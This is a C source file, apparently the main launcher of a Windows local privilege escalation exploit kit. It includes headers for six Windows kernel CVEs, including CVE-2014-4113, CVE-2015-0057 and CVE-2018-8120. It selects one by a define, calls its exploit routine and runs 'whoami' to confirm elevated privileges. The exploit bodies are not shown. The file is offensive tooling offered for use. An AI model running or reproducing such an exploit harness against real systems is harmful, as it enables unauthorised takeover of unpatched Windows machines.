#include "CVE-2014-4113.h"
#include "CVE-2015-2546.h"
#include "CVE-2015-0057.h"
#include "CVE-2016-0095.h"
#include "CVE-2018-8120.h"
#include "CVE-2016-0165.h"

#define VUL_NAME "CVE-2015-0057"

int main()
{
	BOOL bSucc = FALSE;

	if (strcmp(VUL_NAME, "CVE-2014-4113") == 0)
	{
		bSucc = Exploit_CVE_2014_4113();
	}
	else if (strcmp(VUL_NAME, "CVE-2015-2546") == 0)
	{
		bSucc = Exploit_CVE_2015_2546();
	}
	else if (strcmp(VUL_NAME, "CVE-2016-0095") == 0)
	{
		bSucc = Exploit_2016_0095();
	}
	else if (strcmp(VUL_NAME, "CVE-2018-8120") == 0)
	{
		bSucc = Exploit_CVE_2018_8120();
	}
	else if (strcmp(VUL_NAME, "CVE-2016-0165") == 0)
	{
		bSucc = Exploit_CVE_2016_0165();
	}
	else if (strcmp(VUL_NAME, "CVE-2015-0057") == 0)
	{
		bSucc = Exploit_CVE_2015_0057();
	}

	if (bSucc) printf("Exploit %s sucess...\n", VUL_NAME);
	else printf("Exploit %s fail...\n", VUL_NAME);

	system("whoami");
	system("pause");

	return 0;
}